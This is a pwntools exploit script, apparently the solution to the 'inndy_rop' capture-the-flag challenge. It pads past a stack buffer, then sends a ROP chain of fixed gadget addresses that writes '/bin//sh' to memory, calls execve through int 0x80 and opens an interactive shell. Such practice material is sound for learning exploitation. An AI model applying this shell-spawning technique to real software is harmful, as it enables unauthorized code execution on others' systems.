from struct import pack
from pwn import *
file_path='./inndy_rop'
context(binary=file_path,os='linux',terminal = ['tmux', 'sp', '-h'])
p = process('./inndy_rop')


IMAGE_BASE_0 = 0x08048000 #
rebase_0 = lambda x : p32(x + IMAGE_BASE_0)

rop = b'A'*0xC+b'B'*4

rop += rebase_0(0x00070016) # 0x080b8016: pop eax; ret; 
rop += b'//bi'
rop += rebase_0(0x00026cda) # 0x0806ecda: pop edx; ret; 
rop += rebase_0(0x000a2060)
rop += rebase_0(0x0000c66b) # 0x0805466b: mov dword ptr [edx], eax; ret; 
rop += rebase_0(0x00070016) # 0x080b8016: pop eax; ret; 
rop += b'n/sh'
rop += rebase_0(0x00026cda) # 0x0806ecda: pop edx; ret; 
rop += rebase_0(0x000a2064)
rop += rebase_0(0x0000c66b) # 0x0805466b: mov dword ptr [edx], eax; ret; 
rop += rebase_0(0x00070016) # 0x080b8016: pop eax; ret; 
rop += p32(0x00000000)
rop += rebase_0(0x00026cda) # 0x0806ecda: pop edx; ret; 
rop += rebase_0(0x000a2068)
rop += rebase_0(0x0000c66b) # 0x0805466b: mov dword ptr [edx], eax; ret; 
rop += rebase_0(0x000001c9) # 0x080481c9: pop ebx; ret; 
rop += rebase_0(0x000a2060)
rop += rebase_0(0x00096769) # 0x080de769: pop ecx; ret; 
rop += rebase_0(0x000a2068)
rop += rebase_0(0x00026cda) # 0x0806ecda: pop edx; ret; 
rop += rebase_0(0x000a2068)
rop += rebase_0(0x00070016) # 0x080b8016: pop eax; ret; 
rop += p32(0x0000000b)
rop += rebase_0(0x00027430) # 0x0806f430: int 0x80; ret; 
print(rop)
p.sendline(rop)
p.interactive()
